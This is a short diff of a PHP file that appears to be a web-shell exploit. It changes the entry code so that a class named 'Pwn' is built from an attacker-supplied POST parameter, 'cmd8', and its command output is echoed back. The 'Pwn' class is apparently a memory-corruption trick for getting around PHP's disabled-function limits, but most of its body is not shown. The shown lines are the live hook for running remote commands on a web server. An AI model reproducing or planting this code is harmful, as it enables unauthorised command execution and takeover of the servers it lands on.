@@ -1,6 +1,7 @@
-echo "<pre><code>";
-new Pwn($_POST['cmbypass']);
-echo "</code></pre>";
+<?php
+echo "<code>";
+new Pwn($_POST['cmd8']);
+echo "</code>";
 
 class Helper { public $a, $b, $c; }
 class Pwn {
@@ -160,3 +161,5 @@ class Pwn {
         return $address;
     }
 }
+
+?>
